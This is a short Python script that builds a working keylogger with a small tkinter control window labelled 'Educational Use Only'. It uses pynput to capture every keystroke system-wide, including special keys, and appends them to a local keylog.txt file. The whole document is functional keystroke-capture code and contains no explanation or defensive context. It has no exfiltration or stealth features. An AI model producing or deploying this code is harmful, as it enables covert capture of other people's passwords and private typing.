import pynput.keyboard
import threading
import tkinter as tk
class Keylogger:
    def __init__(self):
        self.log = ""
        self.listener = pynput.keyboard.Listener(on_press=self.on_key_press)
        self.running = False

    def on_key_press(self, key):
        try:
            self.log += key.char
        except AttributeError:
            self.log += f'[{key}]'
        with open("keylog.txt", "a") as file:
            file.write(self.log)
        self.log = ""

    def start_logging(self):
        if not self.running:
            self.listener.start()
            self.running = True

    def stop_logging(self):
        if self.running:
            self.listener.stop()
            self.running = False

logger = Keylogger()

# GUI
window = tk.Tk()
window.title("Keylogger - Educational Use Only")
window.geometry("300x150")

start_btn = tk.Button(window, text="Start Logging", command=logger.start_logging, bg="green", fg="white")
start_btn.pack(pady=10)

stop_btn = tk.Button(window, text="Stop Logging", command=logger.stop_logging, bg="red", fg="white")
stop_btn.pack(pady=10)

window.mainloop()
